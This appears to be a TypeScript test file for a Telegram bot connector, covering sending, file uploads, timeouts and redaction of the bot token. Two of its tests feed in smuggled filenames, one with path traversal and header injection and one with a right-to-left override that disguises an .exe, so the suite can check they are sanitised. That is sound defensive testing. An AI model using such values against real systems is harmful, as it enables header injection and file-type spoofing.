import type { InboundEvent, MessagingConnection, MessagingConnectorInstance, MessagingCredentials } from "@tavi/contracts";
import { describe, expect, it, vi } from "vitest";

import { ChannelDescriptorSchema, channelIdentity } from "@tavi/contracts";

import { createTelegramConnectorDefinition, TELEGRAM_CHANNEL_DESCRIPTOR } from "../src/connector.js";

/**
 * Real Telegram `MessagingConnectorPort` adapter.
 * Every test injects a fake `fetch` — no real network call is ever made.
 */

/** A connection's credentials holding only its bot token. */
function tokenCredentials(token: string | null): MessagingCredentials {
  return { get: async (key) => (key === "token" ? token : null), accessToken: async () => "" };
}

function connectionFixture(): MessagingConnection {
  return {
    connectionId: "conn-1",
    providerId: "telegram",
    accountIdentity: "@fixture_bot",
    workspaceId: "w1",
    configRevision: 1,
    credentialRef: "telegram.botToken",
    enabled: true,
  };
}

function jsonResponse(body: unknown): Response {
  return new Response(JSON.stringify(body), { status: 200, headers: { "content-type": "application/json" } });
}

/**
 * Stands in for a real `getUpdates` long-poll: never resolves on its own,
 * but rejects like real `fetch` does when its `AbortSignal` fires — so
 * `stop()`'s `abortController.abort()` genuinely unblocks the awaiting
 * poll loop instead of hanging the test forever.
 */
function hangUntilAborted(signal?: AbortSignal): Promise<Response> {
  return new Promise<Response>((_resolve, reject) => {
    signal?.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")));
  });
}

describe("createTelegramConnectorDefinition", () => {
  it("declares poll-only, document-capable capabilities", () => {
    const definition = createTelegramConnectorDefinition();
    expect(definition.providerId).toBe("telegram");
    expect(definition.capabilities.receiveMode).toBe("poll");
    // Documents go out through `sendDocument`.
    expect(definition.capabilities.attachments).toBe(true);
    expect(definition.capabilities.maxAttachmentBytes).toBe(50_000_000);
    expect(definition.capabilities.deliveryReceipts).toBe(false);
  });

  it("describes itself as a valid channel, and sends to a named chat and topic", () => {
    expect(ChannelDescriptorSchema.safeParse(TELEGRAM_CHANNEL_DESCRIPTOR).success).toBe(true);
    expect(TELEGRAM_CHANNEL_DESCRIPTOR.providerId).toBe(createTelegramConnectorDefinition().providerId);
    expect(channelIdentity("-1001234567890", TELEGRAM_CHANNEL_DESCRIPTOR.target)).toBe("-1001234567890");
    expect(channelIdentity("@name", TELEGRAM_CHANNEL_DESCRIPTOR.sender)).toBeUndefined();
    const definition = createTelegramConnectorDefinition();
    expect(definition.destinationFor?.({ to: "42" }, connectionFixture())).toEqual({ chatId: "42" });
    expect(definition.destinationFor?.({ to: "-100", threadId: "7" }, connectionFixture())).toEqual({ chatId: "-100", threadId: "7" });
  });

  it("paces sends to a chat as one, whichever topic or message they reply in", () => {
    const definition = createTelegramConnectorDefinition();
    expect(definition.paceTargetOf?.({ chatId: "7", threadId: "3", replyToMessageId: "9" })).toBe("7");
    expect(definition.paceTargetOf?.({ chatId: "7" })).toBe("7");
    expect(definition.paceTargetOf?.({ nonsense: true })).toBeUndefined();
  });

  it("destinationFor replies to a named message when given one", () => {
    expect(createTelegramConnectorDefinition().destinationFor?.({ to: "42", replyToId: "7" }, connectionFixture())).toEqual({
      chatId: "42",
      replyToMessageId: "7",
    });
  });

  it("destinationFromInbound replies to the same chat the message arrived on", () => {
    const definition = createTelegramConnectorDefinition();
    expect(definition.destinationFromInbound?.({ externalConversationId: "12345", externalSenderId: "999" }, connectionFixture())).toEqual({
      chatId: "12345",
    });
  });

  it("start() throws NOT_CONFIGURED when the bound credential resolves to null", async () => {
    const definition = createTelegramConnectorDefinition({ fetch: vi.fn() });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials(null),
    });
    await expect(instance.start()).rejects.toThrow(/absent/);
  });

  it("start() surfaces a failed getMe as UNAVAILABLE and a failed status", async () => {
    const fetchImpl = vi.fn(async () => jsonResponse({ ok: false, error_code: 401, description: "Unauthorized" }));
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await expect(instance.start()).rejects.toThrow(/getMe failed/);
    expect(instance.status().state).toBe("failed");
  });

  it("never lets the token out through a fetch error, on start, probe, buttons or edits", async () => {
    let failing = true;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (failing) throw new TypeError(`fetch failed for ${url}`);
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("secret-bot-token"),
    });
    const started = await instance.start().then(
      () => undefined,
      (error: unknown) => error as Error,
    );
    expect(started?.message).toContain("<redacted>");
    expect(started?.message).not.toContain("secret-bot-token");
    expect(started?.name).toBe("TypeError");
    failing = false;
    await instance.start();
    failing = true;
    for (const call of [
      () => instance.probe(),
      () => instance.answerInteraction?.("cb-1", "ok"),
      () => instance.editMessage?.({ destination: { chatId: "7" }, messageId: "1", text: "x" }),
    ]) {
      const error = await Promise.resolve(call()).then(
        () => undefined,
        (thrown: unknown) => thrown as Error,
      );
      expect(error?.message).toContain("<redacted>");
      expect(error?.message).not.toContain("secret-bot-token");
    }
    failing = false;
    await instance.stop();
  });

  it("gives a getUpdates long poll its poll timeout on top of the request timeout", async () => {
    const aborted: boolean[] = [];
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates") && aborted.length === 0) {
        // Longer than the request timeout, shorter than it plus the poll timeout.
        await new Promise((resolve) => setTimeout(resolve, 150));
        aborted.push(init?.signal?.aborted ?? false);
        return jsonResponse({ ok: true, result: [] });
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({
      fetch: fetchImpl as unknown as typeof fetch,
      requestTimeoutMs: 20,
      pollTimeoutSeconds: 1,
    });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await vi.waitFor(() => expect(aborted).toEqual([false]));
    expect(instance.status().state).toBe("running");
    await instance.stop();
  });

  it("abandons a hung sendMessage after the request timeout as uncertain", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({
      fetch: fetchImpl as unknown as typeof fetch,
      requestTimeoutMs: 20,
      pollTimeoutSeconds: 3600,
    });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({
      effectId: "e1",
      connectionId: "conn-1",
      destination: { chatId: "7" },
      parts: [{ content: "hello" }],
    });
    expect(outcome.status).toBe("uncertain");
    await instance.stop();
  });

  it("start() succeeds through a real getMe and reaches running status", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    expect(instance.status().state).toBe("running");
    await instance.stop();
    expect(instance.status().state).toBe("stopped");
  });

  it("send() maps a successful sendMessage to an accepted outcome with a providerMessageId", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) return jsonResponse({ ok: true, result: { message_id: 42, date: 0, chat: { id: 7 } } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] });
    expect(outcome).toEqual({ status: "accepted", retryable: false, parts: [{ index: 0, status: "accepted", providerMessageId: "42" }] });
    await instance.stop();
  });

  it("send() maps a non-429 Telegram rejection to a non-retryable rejected outcome", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) return jsonResponse({ ok: false, error_code: 400, description: "chat not found" });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({
      effectId: "e1",
      connectionId: "conn-1",
      destination: { chatId: 999 },
      parts: [{ content: "hi" }],
    });
    expect(outcome.status).toBe("rejected");
    expect(outcome.retryable).toBe(false);
    await instance.stop();
  });

  it("send() maps a 429 rate-limit rejection to non-retryable but still surfaces retryAfterMs", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) {
        return jsonResponse({ ok: false, error_code: 429, description: "Too Many Requests", parameters: { retry_after: 3 } });
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] });
    expect(outcome.status).toBe("rejected");
    // Never auto-retried at this layer — a rejection stays non-retryable
    // even at 429 — but the provider-mandated delay is still forwarded.
    expect(outcome.retryable).toBe(false);
    expect(outcome.retryAfterMs).toBe(3000);
    await instance.stop();
  });

  it("send() rejects a message with more parts than maxPartsPerMessage before calling the connector", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await expect(
      instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "a" }, { content: "b" }] }),
    ).rejects.toThrow(/maxPartsPerMessage/);
    expect(fetchImpl).not.toHaveBeenCalledWith(expect.stringContaining("/sendMessage"), expect.anything());
    await instance.stop();
  });

  it("send() maps a network error to an uncertain, retryable outcome", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) throw new Error("network unreachable");
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] });
    expect(outcome.status).toBe("uncertain");
    expect(outcome.retryable).toBe(true);
    await instance.stop();
  });

  it.each([
    ["an envelope of the wrong shape", () => jsonResponse({ ok: true })],
    ["a body that is not JSON", () => new Response("<html>", { status: 200 })],
  ])("send() records %s as uncertain, never a final rejection", async (_label, answer) => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) return answer();
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    const outcome = await instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] });
    expect(outcome.status).toBe("uncertain");
    expect(outcome.retryable).toBe(true);
    expect(outcome.parts[0]?.status).toBe("uncertain");
    expect(JSON.stringify(outcome)).not.toContain("test-token");
    await instance.stop();
  });

  it("send() throws INVALID_INPUT for a malformed destination, never softened into an outcome", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await expect(
      instance.send({ effectId: "e1", connectionId: "conn-1", destination: { wrongField: true }, parts: [{ content: "hi" }] }),
    ).rejects.toThrow(/invalid/);
    await instance.stop();
  });

  it("send() refuses to call the connector when not running", async () => {
    const definition = createTelegramConnectorDefinition({ fetch: vi.fn() as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await expect(
      instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] }),
    ).rejects.toThrow(/not running/);
  });

  describe("sendDocument (file parts)", () => {
    const PDF_BYTES = new TextEncoder().encode("%PDF-1.7\nfixture\n");

    async function startInstance(input: {
      readonly sendDocument?: (init: RequestInit | undefined) => Response | Promise<Response>;
      readonly readArtifact?: (
        artifactId: string,
        workspaceId: string,
      ) => { readonly bytes: Uint8Array; readonly contentType: string } | undefined;
      readonly uploadTimeoutMs?: number;
    }): Promise<{ instance: MessagingConnectorInstance; fetchImpl: ReturnType<typeof vi.fn> }> {
      const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
        if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
        if (url.includes("/sendDocument")) {
          if (input.sendDocument === undefined) throw new Error("sendDocument was called but this test configured no response for it");
          return input.sendDocument(init);
        }
        return hangUntilAborted(init?.signal ?? undefined);
      });
      const definition = createTelegramConnectorDefinition({
        fetch: fetchImpl as unknown as typeof fetch,
        ...(input.readArtifact === undefined ? {} : { readArtifact: input.readArtifact }),
        ...(input.uploadTimeoutMs === undefined ? {} : { uploadTimeoutMs: input.uploadTimeoutMs }),
      });
      const instance = definition.createConnection({
        connection: connectionFixture(),
        config: {},
        credentials: tokenCredentials("test-token"),
      });
      await instance.start();
      return { instance, fetchImpl };
    }

    const fileMessage = (overrides: { readonly filename?: string; readonly caption?: string; readonly mimeType?: string } = {}) => ({
      effectId: "e1",
      connectionId: "conn-1",
      destination: { chatId: 7 },
      parts: [{ kind: "file" as const, artifactId: "art-1", ...overrides }],
    });

    it("abandons a hung upload after the upload timeout as uncertain", async () => {
      const { instance } = await startInstance({
        sendDocument: (init) => hangUntilAborted(init?.signal ?? undefined),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
        uploadTimeoutMs: 20,
      });
      const outcome = await instance.send(fileMessage({ filename: "brief.pdf" }));
      expect(outcome.status).toBe("uncertain");
      expect(outcome.parts[0]?.status).toBe("uncertain");
      await instance.stop();
    });

    it("uploads a file part as multipart/form-data and maps the result to an accepted receipt", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 88, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage({ filename: "brief.pdf", caption: "Morning brief" }));
      expect(outcome).toEqual({ status: "accepted", retryable: false, parts: [{ index: 0, status: "accepted", providerMessageId: "88" }] });

      const [url, init] = fetchImpl.mock.calls.find(([callUrl]) => String(callUrl).includes("/sendDocument")) as [string, RequestInit];
      expect(url).toContain("/sendDocument");
      // The runtime must supply its own multipart boundary — setting a
      // content-type here would make the Bot API see zero parts.
      expect(init.headers).toBeUndefined();
      const form = init.body as FormData;
      expect(form).toBeInstanceOf(FormData);
      expect(form.get("chat_id")).toBe("7");
      expect(form.get("caption")).toBe("Morning brief");
      const document = form.get("document") as File;
      expect(document.name).toBe("brief.pdf");
      expect(document.type).toBe("application/pdf");
      expect(new Uint8Array(await document.arrayBuffer())).toEqual(PDF_BYTES);
      await instance.stop();
    });

    it("derives a filename from the artifact's content type when the caller names none and forwards reply_to_message_id", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 89, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      await instance.send({ ...fileMessage(), destination: { chatId: 7, replyToMessageId: 5 } });
      const [, init] = fetchImpl.mock.calls.find(([callUrl]) => String(callUrl).includes("/sendDocument")) as [string, RequestInit];
      const form = init.body as FormData;
      expect((form.get("document") as File).name).toBe("art-1.pdf");
      expect(form.get("reply_to_message_id")).toBe("5");
      await instance.stop();
    });

    it("neutralizes a caller-supplied filename before it reaches the multipart Content-Disposition header", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 90, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      await instance.send(fileMessage({ filename: '../../etc/pa"ss\r\nX-Injected: 1.pdf' }));
      const [, init] = fetchImpl.mock.calls.find(([callUrl]) => String(callUrl).includes("/sendDocument")) as [string, RequestInit];
      const name = (init.body as FormData).get("document") as File;
      // No CR/LF (a header of the attacker's choosing), no quote (which would
      // close the quoted filename parameter), no traversal, no leading dot.
      expect(name.name).not.toMatch(/[\r\n"]/);
      expect(name.name).not.toContain("..");
      expect(name.name).not.toContain("/");
      expect(name.name.startsWith(".")).toBe(false);
      await instance.stop();
    });

    it("rejects an artifact larger than maxAttachmentBytes before any request is made", async () => {
      const { instance, fetchImpl } = await startInstance({
        readArtifact: () => ({ bytes: new Uint8Array(50_000_001), contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.parts[0]?.error).toMatch(/exceeding maxAttachmentBytes/);
      // Nothing was submitted, so this is a safe-to-retry rejection rather
      // than an unconfirmable one — and no bytes left the process.
      expect(outcome.retryable).toBe(false);
      expect(fetchImpl).not.toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
      await instance.stop();
    });

    it("accepts an artifact of exactly maxAttachmentBytes (the gate is a ceiling, not a limit-minus-one)", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 91, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: new Uint8Array(50_000_000), contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("accepted");
      expect(fetchImpl).toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
      await instance.stop();
    });

    it("rejects an unavailable artifact without any request", async () => {
      const { instance, fetchImpl } = await startInstance({ readArtifact: () => undefined });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.parts[0]?.error).toMatch(/not available for delivery/);
      expect(fetchImpl).not.toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
      await instance.stop();
    });

    it("rejects a file part when no artifact store is wired at all", async () => {
      const { instance, fetchImpl } = await startInstance({});
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.parts[0]?.error).toMatch(/no artifact store is wired/);
      expect(fetchImpl).not.toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
      await instance.stop();
    });

    it("turns a throwing artifact reader into that part's rejection, with no reader-supplied path in the message", async () => {
      const { instance } = await startInstance({
        readArtifact: () => {
          // Shaped like the real store's own failure: `readArtifactBody` is a
          // `readFileSync`, so its errors carry an absolute path under the data
          // directory. This string becomes a part receipt, the model-visible
          // tool result and the durable effect receipt — none of which should
          // learn where the artifacts live.
          throw new Error("ENOENT: no such file or directory, open '/Users/operator/.tavi/artifacts/ab/cd/blob'");
        },
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.parts[0]?.error).toMatch(/could not be read/);
      expect(outcome.parts[0]?.error).not.toMatch(/ENOENT|\/Users\/|artifacts\//);
      await instance.stop();
    });

    it("rejects malformed parts instead of throwing out of send() or uploading an empty document", async () => {
      // A persisted outbox row is replayed with an unchecked
      // `JSON.parse(...) as OutboundMessage`, so these shapes are reachable at
      // runtime even though the TypeScript types forbid them.
      const malformed: readonly {
        readonly label: string;
        readonly part: unknown;
        readonly reader?: () => { bytes: unknown; contentType: string };
      }[] = [
        { label: "no artifactId", part: { kind: "file" } },
        { label: "empty artifactId", part: { kind: "file", artifactId: "" } },
        { label: "non-string artifactId", part: { kind: "file", artifactId: 7 } },
        {
          label: "bytes that are not a Uint8Array",
          part: { kind: "file", artifactId: "art-1" },
          reader: () => ({ bytes: { length: 12 }, contentType: "application/pdf" }),
        },
        {
          label: "zero-length bytes",
          part: { kind: "file", artifactId: "art-1" },
          reader: () => ({ bytes: new Uint8Array(0), contentType: "application/pdf" }),
        },
      ];
      for (const entry of malformed) {
        const { instance, fetchImpl } = await startInstance({
          readArtifact: entry.reader === undefined ? () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }) : (entry.reader as never),
        });
        const outcome = await instance.send({
          effectId: "e1",
          connectionId: "conn-1",
          destination: { chatId: 7 },
          parts: [entry.part as never],
        });
        expect(outcome.status, entry.label).toBe("rejected");
        expect(fetchImpl, entry.label).not.toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
        await instance.stop();
      }
    });

    it("passes the sending workspace to the artifact reader, preferring the message's own claim", async () => {
      const seen: (string | undefined)[] = [];
      const { instance } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 92, date: 0, chat: { id: 7 } } }),
        readArtifact: (_artifactId, workspaceId) => {
          seen.push(workspaceId);
          return { bytes: PDF_BYTES, contentType: "application/pdf" };
        },
      });
      // No claim on the message: the connection's own workspace is forwarded.
      await instance.send(fileMessage());
      // A message that names its workspace overrides it — the composition
      // reader keys the artifact's ownership on this value, so which one it
      // receives decides whether a cross-workspace document can ship.
      await instance.send({ ...fileMessage(), workspaceId: "workspace-b" });
      expect(seen).toEqual(["w1", "workspace-b"]);
      await instance.stop();
    });

    it("refuses a populated artifactIds list rather than silently delivering nothing", async () => {
      const { instance, fetchImpl } = await startInstance({
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      await expect(instance.send({ ...fileMessage(), artifactIds: ["art-1"] })).rejects.toThrow(/does not honor/);
      expect(fetchImpl).not.toHaveBeenCalledWith(expect.stringContaining("/sendDocument"), expect.anything());
      await instance.stop();
    });

    it("falls back to .bin for an unrecognized content type", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 93, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/octet-stream" }),
      });
      await instance.send(fileMessage());
      const [, init] = fetchImpl.mock.calls.find(([url]) => String(url).includes("/sendDocument")) as [string, RequestInit];
      expect(((init.body as FormData).get("document") as File).name).toBe("art-1.bin");
      await instance.stop();
    });

    it("falls back to a fixed name when a supplied filename sanitizes away entirely", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 94, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      await instance.send(fileMessage({ filename: "..." }));
      const [, init] = fetchImpl.mock.calls.find(([url]) => String(url).includes("/sendDocument")) as [string, RequestInit];
      expect(((init.body as FormData).get("document") as File).name).toBe("artifact");
      await instance.stop();
    });

    it("bounds a very long filename and strips bidirectional override characters", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 95, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      await instance.send(fileMessage({ filename: `${"n".repeat(300)}.pdf` }));
      // U+202E RIGHT-TO-LEFT OVERRIDE: harmless to the header, but it makes
      // `invoice\u202Efdp.exe` render reversed in the recipient's chat.
      await instance.send(fileMessage({ filename: "invoice\u202Efdp.exe" }));
      const names = fetchImpl.mock.calls
        .filter(([url]) => String(url).includes("/sendDocument"))
        .map(([, init]) => ((init.body as FormData).get("document") as File).name);
      expect(names[0]?.length).toBe(128);
      expect(names[1]).toBe("invoicefdp.exe");
      await instance.stop();
    });

    it("honors a caller-supplied mimeType over the artifact's own content type", async () => {
      const { instance, fetchImpl } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true, result: { message_id: 96, date: 0, chat: { id: 7 } } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "text/plain" }),
      });
      await instance.send(fileMessage({ mimeType: "application/pdf" }));
      const [, init] = fetchImpl.mock.calls.find(([url]) => String(url).includes("/sendDocument")) as [string, RequestInit];
      expect(((init.body as FormData).get("document") as File).type).toBe("application/pdf");
      await instance.stop();
    });

    it("surfaces retryAfterMs from a 429 on the document path, without auto-retrying", async () => {
      const { instance } = await startInstance({
        sendDocument: () => jsonResponse({ ok: false, error_code: 429, description: "Too Many Requests", parameters: { retry_after: 3 } }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.retryable).toBe(false);
      expect(outcome.retryAfterMs).toBe(3000);
      await instance.stop();
    });

    it("maps a sendDocument transport error to an uncertain, retryable outcome", async () => {
      const { instance } = await startInstance({
        sendDocument: () => {
          throw new Error("network unreachable");
        },
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("uncertain");
      expect(outcome.retryable).toBe(true);
      await instance.stop();
    });

    it("maps a malformed sendDocument answer to an uncertain, retryable outcome", async () => {
      const { instance } = await startInstance({
        sendDocument: () => jsonResponse({ ok: true }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("uncertain");
      expect(outcome.retryable).toBe(true);
      await instance.stop();
    });

    it("maps a sendDocument API rejection to a non-retryable rejected outcome", async () => {
      const { instance } = await startInstance({
        sendDocument: () => jsonResponse({ ok: false, error_code: 400, description: "chat not found" }),
        readArtifact: () => ({ bytes: PDF_BYTES, contentType: "application/pdf" }),
      });
      const outcome = await instance.send(fileMessage());
      expect(outcome.status).toBe("rejected");
      expect(outcome.parts[0]?.error).toBe("chat not found");
      await instance.stop();
    });
  });

  it("still sends while the poll loop is degraded, because a receive hiccup is not a send failure", async () => {
    // A `getUpdates` transport error sets status to "failed" for the 2s
    // backoff window; a failure alert sent in that window must not be refused
    // with "connection is not running" — that would lose a delivery for a
    // reason that has nothing to do with delivering.
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) return jsonResponse({ ok: true, result: { message_id: 5, date: 0, chat: { id: 7 } } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls === 1) throw new Error("temporary network failure");
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    // A 150ms backoff keeps the connector in its degraded window long enough to
    // assert against, and resolves well within the rest of the suite.
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 150 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    for (let spin = 0; spin < 50 && instance.status().state === "running"; spin += 1) {
      await new Promise((resolve) => setTimeout(resolve, 2));
    }
    expect(instance.status().state).toBe("failed");
    const outcome = await instance.send({
      effectId: "e1",
      connectionId: "conn-1",
      destination: { chatId: 7 },
      parts: [{ content: "alert" }],
    });
    expect(outcome.status).toBe("accepted");
    // `probe` still reports the degraded receive side honestly.
    expect((await instance.probe()).ok).toBe(false);
    await instance.stop();
  });

  it("refuses to send after stop(), even though it sent successfully while running", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/sendMessage")) return jsonResponse({ ok: true, result: { message_id: 5, date: 0, chat: { id: 7 } } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await instance.stop();
    await expect(
      instance.send({ effectId: "e1", connectionId: "conn-1", destination: { chatId: 7 }, parts: [{ content: "hi" }] }),
